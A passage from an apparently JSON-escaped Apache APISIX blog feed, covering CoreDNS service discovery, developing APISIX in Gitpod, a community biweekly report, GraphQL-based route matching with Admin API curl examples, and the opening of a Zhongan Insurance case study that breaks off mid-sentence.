hello\\n          # Bind the service name \\"coredns\\" to the IP address\\n          fallthrough\\n      }\\n      forward . 114.114.114.114:53\\n      log\\n  }\\n```\\n\\n3. Configuring Apache APISIX.\\n\\nAdd the relevant configuration in the `conf/config.yaml` file and reload Apache APISIX.\\n\\n```Shell\\n  # config.yml\\n  # ...other config\\n  discovery:\\n     dns:\\n       servers:\\n          - \\"127.0.0.1:1053\\"          # Use the real address of the DNS server,\\n                                      # here is the 1053 port of the local machine.\\n```\\n\\n4. Configure routing information in Apache APISIX.\\n\\nNext, we configure the relevant routing information by requesting the `Admin API`.\\n\\n```Shell\\n  curl http://127.0.0.1:9080/apisix/admin/routes/1 \\\\\\n  -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n  {\\n      \\"uri\\": \\"/core/*\\",\\n      \\"upstream\\": {\\n          \\"service_name\\": \\"hello:3005\\",\\n          # Name the service as coredns, consistent with\\n          # the configuration of the hosts plugin in CoreDNS\\n          \\"type\\": \\"roundrobin\\",\\n          \\"discovery_type\\": \\"dns\\" # Set service discovery type to DNS\\n      }\\n  }\'\\n```\\n\\n5. verify.\\n\\n- Authenticate on the local machine\\n\\n```Shell\\n  curl 127.0.0.1:9080/core/hello -i\\n\\n  HTTP/1.1 200 OK\\n  Content-Type: text/plain; charset=utf-8\\n  Content-Length: 11\\n  Connection: keep-alive\\n  Date: Wed, 16 Feb 2022 08:44:08 GMT\\n  Server: APISIX/2.12.1\\n\\n  Hello World\\n```\\n\\n- Verify on other hosts\\n\\n```Shell\\n  curl 10.10.10.10:9080/core/hello -i\\n\\n  HTTP/1.1 200 OK\\n  Content-Type: text/plain; charset=utf-8\\n  Content-Length: 11\\n  Connection: keep-alive\\n  Date: Wed, 16 Feb 2022 08:43:32 GMT\\n  Server: APISIX/2.12.0\\n\\n  Hello World\\n```\\n\\nAs you can see from the above results, the service is running normally.\\n\\n6. The IP address of the simulated container is changed because the container cannot provide services for various reasons.\\n\\nWe need to set up the same service on another server, also running on port `3005`, but with the IP address changed, and the return string changed to `Hello, Apache APISIX`.\\n\\n```Shell\\nconst Koa = require(\'koa\');\\nconst app = new Koa();\\n\\napp.use(async ctx => {\\n  ctx.body = \'Hello, Apache APISIX\';\\n});\\n\\napp.listen(3005);\\n````\\n\\nModify the `Corefile` configuration and restart Core DNS. Leave other configurations unchanged. The configuration example is as follows:\\n\\n```Shell\\n.:1053 {                         # Listen on port 1053\\n    hosts {\\n        10.10.10.11 hello        # Modify service IP address\\n        # Bind the service name \\"coredns\\" to the IP address\\n        fallthrough\\n    }\\n    forward . 114.114.114.114:53\\n    log\\n}\\n```\\n\\n> DNS has a caching mechanism. When we use the `dig` command to request to resolve a new domain name, we will see a number field in the returned `DNS record`, that is, the `TTL` field, which is generally `3600`, which is one hour. Requests sent to the domain name within the `TTL` period will no longer request the DNS server to resolve the address, but will directly obtain the address corresponding to the domain name in the local cache.\\n\\nBy verifying, we can find that the request has been redirected to the new address. Verify as follows:\\n\\n```Shell\\n  curl 127.0.0.1:9080/core/hello -i\\n\\n  HTTP/1.1 200 OK\\n  Content-Type: text/plain; charset=utf-8\\n  Content-Length: 11\\n  Connection: keep-alive\\n  Date: Wed, 16 Feb 2022 08:44:08 GMT\\n  Server: APISIX/2.12.0\\n\\n  Hello, Apache APISIX\\n```\\n\\n## Summary\\n\\nThis article mainly introduces the types of service discovery and how to use CoreDNS in Apache APISIX. You can use Apache APISIX and CoreDNS according to your business needs and past technical architecture.\\n\\nApache APISIX is also currently working on additional plugins to support the integration of additional services, so if you are interested, feel free to start a discussion in [GitHub Discussions](https://github.com/apache/apisix/discussions), or via the [mailing list](https://apisix.apache.org/zh/docs/general/join) to communicate."},{"id":"How to Use Gitpod to Develop API Gateway?","metadata":{"permalink":"/blog/2022/03/03/develop-apisix-with-gitpod","source":"@site/blog/2022/03/03/develop-apisix-with-gitpod.md","title":"How to Use Gitpod to Develop API Gateway?","description":"This article introduces the open source cloud IDE product - Gitpod, and demonstrates how to use Gitpod to develop API gateway Apache APISIX and solutions to common problems.","date":"2022-03-03T00:00:00.000Z","formattedDate":"March 3, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":4.98,"truncated":true,"authors":[{"name":"Yong Qian","title":"Author","url":"https://github.com/nic-6443","image_url":"https://avatars.githubusercontent.com/u/22141303?v=4","imageURL":"https://avatars.githubusercontent.com/u/22141303?v=4"},{"name":"Sylvia","title":"Technical Writer","url":"https://github.com/SylviaBABY","image_url":"https://avatars.githubusercontent.com/u/39793568?v=4","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"Apache APISIX with CoreDNS enrich service discovery","permalink":"/blog/2022/03/04/apisix-uses-coredns-enable-service-discovery"},"nextItem":{"title":"Biweekly Report (Feb 15 - Feb 28)","permalink":"/blog/2022/03/03/weekly-report-0228"}},"content":"> This article introduces the open source cloud IDE product - Gitpod, and demonstrates how to use Gitpod to develop API gateway Apache APISIX and solutions to common problems.\\n\\n\x3c!--truncate--\x3e\\n\\nWith the advent of the cloud-native wave, all aspects of the software development process are being transformed, and one of the hottest directions is \\"cloud IDE\\". The so-called \\"cloud IDE\\" is the use of cloud computing resources as a development environment for software project development.\\n\\nThis development model has many benefits for developers, such as:\\n\\n- Compute resources are available on demand, so that development efficiency is not affected by hardware limitations.\\n- Development environment standardization, each project\'s development environment may have many software dependencies, these dependencies can be standardized in the form of Docker images.\\n- Quickly start or destroy a development environment for each project to avoid problems such as dependency conflicts when multiple projects are developed in parallel.\\n- For pure Linux environments, it is sometimes more difficult for server-side development students to toss some dependency differences between MacOS and Windows than to develop project code.\\n\\nThe two most popular IDEs are JetBrains and VSCode, and both of these popular development tools have cloud-based products, so it\'s clear that the \\"cloud IDE\\" direction is favored by many developers.\\n\\nApache APISIX is a dynamic, real-time, high-performance API gateway that provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more.\\n\\nApache APISIX, as an open source cloud native API gateway, how to quickly deploy the development environment is more important for developers. This article will introduce an open source cloud IDE product - [Gitpod](https://gitpod.io/), and demonstrate how to use Gitpod to develop Apache APISIX.\\n\\n## Install the Gitpod Chrome Plugin\\n\\nGitpod provides one-click launch capabilities for the three main code hosting services GitLab, GitHub, and Bitbucket, and only requires the [Chrome plugin](https://chrome.google.com/webstore/detail/gitpod-always-ready-to-co/dodmmooeoklaejobgleioelladacbeki) to be installed for subsequent use.\\n\\nOnce installed, the plugin injects a launch button on the code repository page, here we\'ll use GitHub as an example. After installing the plugin, open the APISIX project address and you will see the relevant button.\\n\\n![error/github example.png](https://static.apiseven.com/202108/1646233179407-391328ba-68cd-41df-8454-3c7d280bbc6e.png)\\n\\nClicking the button will redirect you to the Gitpod page. After completing the GitHub application authorization, you will be taken to the following screen.\\n\\n![erro/gitpod UI.png](https://static.apiseven.com/202108/1646233426671-547eb71c-9294-43af-b144-ea3298343341.png)\\n\\nDoes it look very familiar? Yes, this is VSCode, the most popular code editor.\\n\\nGitpod maintains a branch of VSCode to implement an architecture that separates the VSCode client from the server. As a VSCode that grows on the cloud, it functions the same as the desktop version. The same plugins we use for local development can be used on the cloud, but unlike local, VSCode on the cloud has server-level computing resources and a network environment.\\n\\n## Set Up an APISIX Development Environment with Gitpod\\n\\n### Step 1: Execute Test Cases\\n\\nI\'m sure many students who are new to open source have struggled with how to build a development environment for open source projects. One of the major differences between open source projects and enterprise development is that open source projects often have a large number of test cases that are automated to ensure the quality of the project, so running these test cases locally is probably the first problem we encounter.\\n\\nLet\'s try running the APISIX test cases in Gitpod. Here\'s how to configure the dependencies in the APISIX repository using [github workflow](https://github.com/apache/apisix/blob/master/.github/workflows/build.yml). Run the following steps in the Gitpod terminal.\\n\\n```Shell\\n# Start the components that CI depends on\\nmake ci-env-up project_compose_ci=ci/pod/docker-compose.common.yml\\n\\n# Install compilation dependency\\nsudo apt install -y cpanminus build-essential libncurses5-dev libreadline-dev libssl-dev perl libpcre3 libpcre3-dev libldap2-dev\\n\\n# Compile and execute test cases\\nsudo OPENRESTY_VERSION=default ./ci/linux_openresty_1_17_runner.sh do_install\\nsudo ./ci/linux_openresty_1_17_runner.sh script\\n```\\n\\n:::tip\\n\\nIf you get the following error:\\n\\n````\\nOPENRESTY_VERSION=default ./ci/linux_openresty_1_19_runner.sh do_install\\nbash: ./ci/linux_openresty_1_19_runner.sh: No such file or directory\\n````\\n\\nPlease see the `linux_openresty_1_19_runner.sh` script corresponding to the latest version of APISIX in the `ci` directory.\\n\\n:::\\n\\n### Step 2: Accessing HTTP services\\n\\nSo how do we access the HTTP services (e.g. APISIX) started in the project?\\n\\nNaturally, it is possible to access it through the terminal. But if you want to access it through the page, you can also expose the open port to the public network through Remote Explorer, as shown in the following figure.\\n\\n![error/access page example.png](https://static.apiseven.com/202108/1646234288822-b7e30fce-604f-451a-b87f-3b72309b246a.png)\\n\\nThen, by clicking on the browser icon next to the port, Gitpod will automatically open a link to the service corresponding to that port.\\n\\n## FAQ Summary\\n\\n### Browser-Based Experience\\n\\nOne of the major problems with using Gitpod in the browser is that many VSCode shortcuts are captured by the browser, making it impossible to perform the corresponding action.\\n\\nHere\'s how to do it.\\n\\n1. Install the Gitpod plugin in VSCode\'s Plugin Marketplace.\\n\\n![error/install gitpod plugin.png](https://static.apiseven.com/202108/1646234524665-0e860b0b-ec80-4ba9-a893-cfa79d3f48c3.png)\\n\\n2. Then click `Gitpod: Open in VS Code` on the Gitpod page in your browser. You can then pull up your local VSCode as a client and connect to the Gitpod in the cloud to get the same coding experience as the desktop version.\\n\\n![error/open in vs code.png](https://static.apiseven.com/202108/1646234630208-bc8912a8-9542-4888-9cde-8889631d2ea8.png)\\n\\n### Private Deployment\\n\\nAs we mentioned earlier, Gitpod is an open source product, so it is possible to deploy it privately within your organization, so that you can use this great development tool in your private repository. For more information on how to deploy Gitpod, see the [official Gitpod documentation and repository](https://github.com/gitpod-io/gitpod).\\n\\n## Summary\\n\\nThe beauty of Gitpod is that it allows developers to get started with a project quickly, which is very much in line with the needs of the open source community. Because open source projects can often feel like a mystery to developers who are new to open source, it can be a deterrent, but you\'ll find that it\'s not.\\n\\nI hope that through the introduction and description of this article, every developer interested in open source projects with the help of open source tools can more easily join the open source community, so that the open source ecosystem continues to prosper."},{"id":"Biweekly Report (Feb 15 - Feb 28)","metadata":{"permalink":"/blog/2022/03/03/weekly-report-0228","source":"@site/blog/2022/03/03/weekly-report-0228.md","title":"Biweekly Report (Feb 15 - Feb 28)","description":"API Gateway The Apache APISIX community has supported mocking, clickhouse plugins, and support for Kubernetes as a service discovery for the last two weeks.","date":"2022-03-03T00:00:00.000Z","formattedDate":"March 3, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.605,"truncated":true,"authors":[],"prevItem":{"title":"How to Use Gitpod to Develop API Gateway?","permalink":"/blog/2022/03/03/develop-apisix-with-gitpod"},"nextItem":{"title":"Use GraphQL with API Gateway Apache APISIX","permalink":"/blog/2022/03/02/apisix-integration-graphql"}},"content":"> From 2.15 to 2.28, 43 contributors submitted 101 commits for Apache APISIX. Thank you all for your contributions to Apache APISIX. It is your selfless contribution to make the Apache APISIX project better!\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX has grown as a community from the first day of open source and has quickly become the most active open source API gateway project in the world. These achievements cannot be achieved without the joint efforts of our community partners.\\n\\n\\"If you want to go fast, go alone.If you want to go far, go together.\\" The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community and and facilitate everyone to participate in the Apache APISIX community.\\n\\nWe have also compiled some issues suitable for newcomers to the community to participate in! If you are interested, don\'t miss it!\\n\\n## Contributor Statistics\\n\\n![Contributors List](https://static.apiseven.com/202108/1646206544039-67c75831-7452-40be-a635-2cc6bb6d02b3.jpg)\\n\\n![New Contributors](https://static.apiseven.com/202108/1646206544068-9811972f-18f8-47a3-a028-06f94d07936f.jpg)\\n\\n## Good first issue\\n\\n### Issue #920\\n\\n**Link**: https://github.com/apache/apisix-website/issues/920\\n\\n**Issue description**:\\n\\nWhen submitting a pull request to add a new blog to the website\'s blog section, usually we need to submit 2 files, one in English and the other in Chinese.\\n\\nAs the community grows, blog in both languages are becoming more diverging than before. Thus, writing and submitting blogs in single-language is the trend.\\n\\nBut the actual behavior is that: when submitting an English blog, and clicking the language conversion button on the top-right corner, it would jump to the default 404 page. I am wondering if there is any chance to enhance the reading experience on this part.\\n\\n### Issue #6460\\n\\n**Link**: https://github.com/apache/apisix/issues/6460\\n\\n**Issue description**:\\n\\nUsing the `authz-keycloak` plugin when access is not permitted you correctly receive an access denied message in the body of the requested url.\\n\\n```Json\\n{\\"error\\":\\"access_denied\\",\\"error_description\\":\\"not_authorized\\"}\\n```\\n\\nIs it possible to specify a redirect url to be used when the access is denied so the user see predefined page instead of a message?\\n\\n## Highlights of Recent Features\\n\\n- [Push access log to clickhouse DB](https://github.com/apache/apisix/pull/6215)(Contributor: [zhendongcmss](https://github.com/zhendongcmss))\\n\\n- [Add Kubernetes discovery module](https://github.com/apache/apisix/pull/4880)(Contributor: [zhixiongdu027](https://github.com/zhixiongdu027))\\n\\n- [Add config to control return all status at X-APISIX-Upstream-Status](https://github.com/apache/apisix/pull/6392)\uff08Contributor: [liangliang4ward](https://github.com/liangliang4ward))\\n\\n- [Add `mocking` plugin](https://github.com/apache/apisix/pull/5940)(Contributor: [Drery](https://github.com/Drery))\\n\\nThe Apache APISIX project website and the Github issue have accumulated a wealth of documentation and experience, so if you encounter problems, you can read the documentation, search the issue with keywords, or participate in the discussion on the issue to put forward your own ideas and practical experience.\\n\\n## Recent Blog Recommendations\\n\\n- [The practice of Nacos service discovery on API Gateway](https://apisix.apache.org/blog/2022/02/21/nacos-api-gateway)\uff1a\\n\\n  This article introduces the basic concepts of Apache APISIX and Nacos and Service Registry, and shows you the practice of Nacos service discovery on API Gateway.\\n\\n- [Apache APISIX Enhances API Security by CSRF Plugin](https://apisix.apache.org/blog/2022/02/23/csrf-api-gateway):\\n\\n  This article introduces `csrf`, the CSRF security plugin for Apache APISIX, and details how to secure your API information in Apache APISIX with the help of the `csrf` plugin.\\n\\n- [How to Integrate API Gateway and Consul?](https://apisix.apache.org/blog/2022/02/25/consul-api-gateway):\\n\\n  Apache APISIX supports the Consul KV-based service discovery registry. This article will walk you through the process of implementing service discovery and service registry in Apache APISIX."},{"id":"Use GraphQL with API Gateway Apache APISIX","metadata":{"permalink":"/blog/2022/03/02/apisix-integration-graphql","source":"@site/blog/2022/03/02/apisix-integration-graphql.md","title":"Use GraphQL with API Gateway Apache APISIX","description":"This article describes the features of the cloud-native API gateway Apache APISIX and GraphQL, and how to use Apache APISIX to proxy GraphQL requests.","date":"2022-03-02T00:00:00.000Z","formattedDate":"March 2, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":8.365,"truncated":true,"authors":[{"name":"JohnChever","title":"Author","url":"https://github.com/Chever-John","image_url":"https://avatars.githubusercontent.com/u/43690894?v=4","imageURL":"https://avatars.githubusercontent.com/u/43690894?v=4"},{"name":"Fei Han","title":"Technical Writer","url":"https://github.com/hf400159","image_url":"https://avatars.githubusercontent.com/u/97138894?v=4","imageURL":"https://avatars.githubusercontent.com/u/97138894?v=4"}],"prevItem":{"title":"Biweekly Report (Feb 15 - Feb 28)","permalink":"/blog/2022/03/03/weekly-report-0228"},"nextItem":{"title":"Implement Traffic Governance in Internet Insurance with APISIX","permalink":"/blog/2022/03/02/zhongan-usercase-with-apache-apisix"}},"content":"> This article introduces the features of Apache APISIX and GraphQL, and how to use the API gateway Apache APISIX to proxy GraphQL requests, and proposes solutions to solve the pain points of practical scenarios.\\n\\n\x3c!--truncate--\x3e\\n\\n## Background Information\\n\\nGraphQL is an open source, API oriented data query operation language and corresponding running environment. Originally developed internally by Facebook in 2012 and publicly released in 2015. On November 7, 2018, Facebook transferred the GraphQL project to the newly established GraphQL foundation.\\n\\nYou can understand GraphQL by analogy with SQL query statements. Compared with SQL query statements, GraphQL provides an easy to understand and complete description of the data in the API, so that the client can accurately obtain the data it needs through the customized description. This also allows the API to calmly face the development of increasingly complex interfaces and avoid eventually becoming a daunting complex interface.\\n\\nApache APISIX is a dynamic, real-time, high-performance API gateway that provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more.\\n\\nAs a cloud native API gateway, Apache APISIX already has the matching ability to recognize GraphQL syntax at the beginning of its design. By efficiently matching GraphQL statements carried in requests, it can filter out abnormal traffic to further ensure security and improve system performance.\\n\\n### Scene Analysis\\n\\nWe are in the era of big data and large traffic, Apache APISIX and GraphQL can be combined to form a win-win situation. The following is a detailed description of a scenario.\\n\\nThis article will discuss the practical application of Apache APISIX and GraphQL in the context of microservice architecture.\\n\\n### Problems Encountered In the Actual Scene\\n\\nIn the late stage of the project, business complexity and team mobility are often the problems. Micro service architecture has become a common solution to such problems. In microservice architecture, GraphQL exposes two kinds of interfaces: decentralized and centralized. However, only centralized interface design can maximize GraphQL\'s advantages. However, in centralized interface design, all microservices are exposed to the same interface. **So processing flow routing cannot simply forwarded according to the URL, but should be based on the request contained in different fields are forwarded.**\\n\\nBecause NGINX only processes URLs and some parameters when processing requests, but only by parsing the query information in the request parameters can the resources accessed by the client be known, so as to perform routing forwarding, so this routing forwarding method cannot be completed through traditional NGINX. . In practical application scenarios, it is very dangerous to directly expose the GraphQL interface to the outside world, so a professional high-performance API gateway is required to protect the GraphQL interface.\\n\\n### Solution\\n\\nBased on the security, stability, and high performance of Apache APISIX, adding flexible routing matching rules to GraphQL is the best solution to GraphQL\'s centralized interface design.\\n\\n![error/graphql architecture.png](https://static.apiseven.com/202108/1646200966179-1d649ab0-8d49-49f5-a8fa-a1a30af0519d.png)\\n\\nIn this scheme, Apache APISIX is deployed before GraphQL Server as an API gateway, providing security for the whole backend system. In addition, Apache APISIX has GraphQL matching functions according to its own. Some of the requests are filtered and processed by the GraphQL Server, making the whole request resource process more efficient.\\n\\nThanks to the dynamic features of Apache APISIX, you can enable plug-ins such as current limiting, authentication, and observability without restarting services, which further improves the operating efficiency of this solution and facilitates operation and maintenance.\\n\\nIn addition, Apache APISIX can also perform different permission checks for different `graphql_operations`, and forward to different Upstream for different graphql_names. The details will be described below.\\n\\n**To sum up, the solution of Apache APISIX + GraphQL can fully utilize the advantages of GraphQL search and also have the security and stability of Apache APISIX as API gateway.**\\n\\n## Application of GraphQL In API Gateway\\n\\n### Basic Logic\\n\\n![error/GraphQL principle.png](https://static.apiseven.com/202108/1646201215532-f5965158-7456-443a-84a7-cadadb95fc1f.png)\\n\\nThe execution logic of GraphQL in Apache APISIX is as follows:\\n\\n1. Clients to  Apache APISIX initiated with GraphQL statements request;\\n2. Apache APISIX matching routing and extract the preset GraphQL data;\\n3. Apache APISIX matches the request data with the preset GraphQL data;\\n\\n- If the match is successful,  Apache APISIX will continue to forward the request;\\n- If the match fails, Apache APISIX will immediately terminate the request.\\n\\n4. Whether plugins exist;\\n\\n- if the plug-in exists, the request will continue to be processed by the plug-in, and after the processing is completed, it will continue to be forwarded to the GraphQL Server;\\n- If no plug-in exists, the request will be forwarded directly to GraphQL Server.\\n\\nIn the internal matching of APISIX core, Apache APISIX implements GraphQL support through the [`graphql-lua`](https://github.com/bjornbytes/graphql-lua) library. The Apache APISIX GraphQL parsing library will first parse the request carrying the GraphQL syntax, and then match the parsed request with the configuration data preset in the Apache APISIX database. If the match is successful, Apache APISIX will pass and forward the request, otherwise it will terminate the request.\\n\\n### Specific Configuration\\n\\nApache APISIX currently supports filtering routes by some properties of GraphQL:\\n\\n- graphql_operation\\n- graphql_name\\n- graphql_root_fields\\n\\nThe GraphQL properties correspond to the GraphQL query statement shown below:\\n\\n```Nginx\\nquery getRepo {\\n    owner {\\n        name\\n    }\\n    repo {\\n        created\\n    }\\n}\\n```\\n\\n- `graphql_operation` corresponds to `query`\\n- `graphql_name` corresponds to `getRepo`\\n- `graphql_root_fields` corresponds to `[\\"owner\\", \\"repo\\"]`\\n\\nYou can set up a route for Apache APISIX to verify GraphQL matching capabilities with the following example:\\n\\n```Shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 \\\\\\n  -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -i -d \'\\n  {\\n      \\"methods\\": [\\"POST\\"],\\n      \\"uri\\": \\"/graphql\\",\\n      \\"vars\\": [\\n          [\\"graphql_operation\\", \\"==\\", \\"query\\"],\\n          [\\"graphql_name\\", \\"==\\", \\"getRepo\\"],\\n          [\\"graphql_root_fields\\", \\"has\\", \\"owner\\"]\\n      ],\\n      \\"upstream\\": {\\n          \\"type\\": \\"roundrobin\\",\\n          \\"nodes\\": {\\n              \\"192.168.1.200:4000\\": 1\\n          }\\n      }\\n  }\'\\n```\\n\\nThen use GraphQL statements request to visit:\\n\\n```Shell\\ncurl -H \'content-type: application/graphql\' \\\\\\n-X POST http://127.0.0.1:9080/graphql -d \'\\nquery getRepo {\\n    owner {\\n        name\\n    }\\n    repo {\\n        created\\n    }\\n}\'\\n```\\n\\nIf the match is successful, Apache APISIX proceeds to forward the request.\\n\\n```Shell\\nHTTP/1.1 200 OK\\n```\\n\\nOtherwise, terminate the request.\\n\\n```Shell\\nHTTP/1.1 404 Not Found\\n```\\n\\n## Advanced Operation\\n\\nApache APISIX can forward to different Upstreams according to different `graphql_names`, and perform different permission checks according to different `graphql_operation`. The following will show you the code configuration for this feature.\\n\\n### Match Upstream with `graphql_name`\\n\\n1. Create the first Upstream:\\n\\n```Shell\\n  curl http://192.168.1.200:9080/apisix/admin/upstreams/1 \\\\\\n  -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n  {\\n      \\"type\\": \\"chash\\",\\n      \\"key\\": \\"remote_addr\\",\\n      \\"nodes\\": {\\n          \\"192.168.1.200:1980\\": 1\\n      }\\n  }\'\\n```\\n\\n2. Create GraphQL route bound to the first Upstream service with `graphql_name` set to `getRepo111`:\\n\\n```Shell\\n  curl http://192.168.1.200:9080/apisix/admin/routes/1 \\\\\\n  -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -i -d \'\\n  {\\n      \\"methods\\": [\\"POST\\"],\\n      \\"uri\\": \\"/graphql\\",\\n      \\"vars\\": [\\n          [\\"graphql_operation\\", \\"==\\", \\"query\\"],\\n          [\\"graphql_name\\", \\"==\\", \\"getRepo111\\"],\\n          [\\"graphql_root_fields\\", \\"has\\", \\"owner\\"]\\n      ],\\n      \\"upstream_id\\": \\"1\\"\\n  }\'\\n```\\n\\n3. Create the second Upstream:\\n\\n```Shell\\n  curl http://192.168.1.200:9080/apisix/admin/upstreams/2 \\\\\\n  -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n  {\\n      \\"type\\": \\"chash\\",\\n      \\"key\\": \\"remote_addr\\",\\n      \\"nodes\\": {\\n          \\"192.168.1.200:1981\\": 1\\n      }\\n  }\'\\n```\\n\\n4. Create a GraphQL route bound to the second upstream service with `graphql_name` set to `getRepo222`:\\n\\n```Shell\\n  curl http://192.168.1.200:9080/apisix/admin/routes/2 \\\\\\n  -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -i -d \'\\n  {\\n      \\"methods\\": [\\"POST\\"],\\n      \\"uri\\": \\"/graphql\\",\\n      \\"vars\\": [\\n          [\\"graphql_operation\\", \\"==\\", \\"query\\"],\\n          [\\"graphql_name\\", \\"==\\", \\"getRepo222\\"],\\n          [\\"graphql_root_fields\\", \\"has\\", \\"owner\\"]\\n      ],\\n      \\"upstream_id\\": 2\\n  }\'\\n```\\n\\n5. Test with the two `graphql_name` services created earlier, you can find that Apache APISIX can automatically select the forwarded Upstream based on the different `graphql_names` in the request.\\n\\n- If the request is this example:\\n\\n```Shell\\n  curl -i -H \'content-type: application/graphql\' \\\\\\n  -X POST http://192.168.1.200:9080/graphql -d \'\\n  query getRepo111 {\\n      owner {\\n          name\\n      }\\n      repo {\\n          created\\n      }\\n  }\'\\n```\\n\\nReturns a response from upstream `192.168.1.200:1980`:\\n\\n```Shell\\n  HTTP/1.1 200 OK\\n  ---URI\\n  /graphql\\n  ---Service Node\\n  Centos-port: 1980\\n```\\n\\n- If the request is this example:\\n\\n```Shell\\n  curl -i -H \'content-type: application/graphql\' \\\\\\n  -X POST http://192.168.1.200:9080/graphql -d \'\\n  query getRepo222 {\\n      owner {\\n          name\\n      }\\n      repo {\\n          created\\n      }\\n  }\'\\n```\\n\\nReturns a response from upstream `192.168.1.200:1981`:\\n\\n```Shell\\n  HTTP/1.1 200 OK\\n  ---URI\\n  /graphql\\n  ---Service Node\\n  Centos-port: 1981\\n```\\n\\n### Use `graphql_operation` for different permission checks\\n\\nThe above example provides a matching rule with `graphql_operation` as query, and now uses GraphQL requests in the form of `mutation`.\\n\\n1. Configure Apache APISIX:\\n\\n```Shell\\n  curl http://192.168.1.200:9080/apisix/admin/routes/11 \\\\\\n  -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n  {\\n      \\"methods\\": [\\"POST\\"],\\n      \\"uri\\": \\"/hello\\",\\n      \\"vars\\": [\\n          [\\"graphql_operation\\", \\"==\\", \\"mutation\\"],\\n          [\\"graphql_name\\", \\"==\\", \\"repo\\"]\\n      ],\\n      \\"upstream\\": {\\n          \\"nodes\\": {\\n              \\"192.168.1.200:1982\\": 1\\n          },\\n          \\"type\\": \\"roundrobin\\"\\n      }\\n  }\'\\n```\\n\\n2. Use `mutation` request to verify Apache APISIX configuration:\\n\\n```Shell\\n  curl -i -H \'content-type: application/graphql\' \\\\\\n  -X POST http://192.168.1.200:9080/hello -d \'\\n  mutation repo($ep: Episode!, $review: ReviewInput!) {\\n    createReview(episode: $ep, review: $review) {\\n      stars\\n      commentary\\n    }\\n  }\'\\n```\\n\\nThe returned result is as follows:\\n\\n```Shell\\n  HTTP/1.1 200 OK\\n  ---URI\\n  /hello\\n  ---Service Node\\n  Centos-port: 1982\\n```\\n\\n## Collocation Plugins\\n\\nApache APISIX has a rich plugin ecosystem to apply different usage scenarios. If you add suitable plug-ins when using Apache APISIX + GraphQL, you can make more scenarios for the solution application.\\n\\nThis article only selects the following two types of plugins as examples.\\n\\n### `limit-count` Plugin\\n\\nWith the use of the `limit-count` plugin, the traffic is further limited after being forwarded by GraphQL matching rules. Thanks to the characteristics of Apache APISIX, dynamic, refined and distributed current and speed limiting can be achieved. For details, please refer to the [Apache APISIX official documentation](https://apisix.apache.org/docs/apisix/plugins/limit-count).\\n\\n### Observability Plugin\\n\\nApache APISIX provides observability plug-ins including but not limited to  [`prometheus`](https://apisix.apache.org/docs/apisix/plugins/prometheus)\u3001[`skywalking`](https://apisix.apache.org/docs/apisix/plugins/skywalking), etc.,which can provide more monitoring indicator data for the system and facilitate the implementation of subsequent operation and maintenance of the system.\\n\\n## Summary\\n\\nThis article briefly introduces the application of GraphQL in Apache APISIX, and uses the actual code to show you the combination of Apache APISIX and GraphQL. Users can use GraphQL in Apache APISIX according to their own business needs and actual scenarios.\\n\\nFor more instructions and complete configuration information about GraphQL, please refer to the [Apache APISIX official documentation](https://apisix.apache.org/docs/apisix/router-radixtree/#how-to-filter-route-by-graphql-attributes).\\n\\nApache APISIX is also currently working on additional plugins to support the integration of additional services, so if you are interested, feel free to start a discussion in [GitHub Discussions](https://github.com/apache/apisix/discussions), or via the [mailing list](https://apisix.apache.org/docs/general/join) to communicate."},{"id":"Implement Traffic Governance in Internet Insurance with APISIX","metadata":{"permalink":"/blog/2022/03/02/zhongan-usercase-with-apache-apisix","source":"@site/blog/2022/03/02/zhongan-usercase-with-apache-apisix.md","title":"Implement Traffic Governance in Internet Insurance with APISIX","description":"we will introduce some business scenarios and practical cases of zhongan and bring you the gateway selection and implementation operation under the \\"Internet Insurance\\" scenario.","date":"2022-03-02T00:00:00.000Z","formattedDate":"March 2, 2022","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":8.785,"truncated":true,"authors":[{"name":"Sylvia","url":"https://github.com/SylviaBABY","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"Use GraphQL with API Gateway Apache APISIX","permalink":"/blog/2022/03/02/apisix-integration-graphql"},"nextItem":{"title":"API Gateway Apache APISIX provides enhancements on API Management","permalink":"/blog/2022/03/01/apisix-integration-public-api-plugin"}},"content":"> The content of this article is sorted out from the relevant sharing brought by Xu Min, head of Zhongan Insurance and Technology Infrastructure in Apache APISIX Weekly Meeting.\\n\\n\x3c!--truncate--\x3e\\n\\nZhongan Insurance is the first and the largest Internet insurance company in China, with sales using an all-Internet format for product sales, no offline agents, and online traffic mainly through self-operated, partner company websites and channels. By actively providing personalized, customized and intelligent insurance varieties, it makes up for the lack of product capabilities of traditional insurance companies.\\n\\nWhen looking at the technical level from the business perspective, there is a strong demand for traffic governance on the technical side in order to meet the complex business scenarios and the proprietary characteristics of the industry of Zhongan. In this article, we will introduce some business scenarios and practical cases of zhongan and bring you the gateway selection and implementation operation under the \\"Internet Insurance\\" scenario.\\n\\n## Business Scenario Features\\n\\n### Multiple Insurance Categories\\n\\nAs we mentioned at the beginning, Zhongan, as the first Internet insurance company in China, offers a very wide range of insurance products, especially like property insurance. There are many kinds of property insurance, and there may be all types that you can think of, such as car insurance, broken screen insurance and health insurance, as well as the common daily shopping refund shipping insurance for Taobao, etc.\\n\\nBasically, as long as everyone encounters something in life, it may be designed as an insurance product, so the Internet insurance scene, the number of types of insurance products is its more characteristic background.\\n\\n### Multi Sales Channels\\n\\nAlthough it is said that all 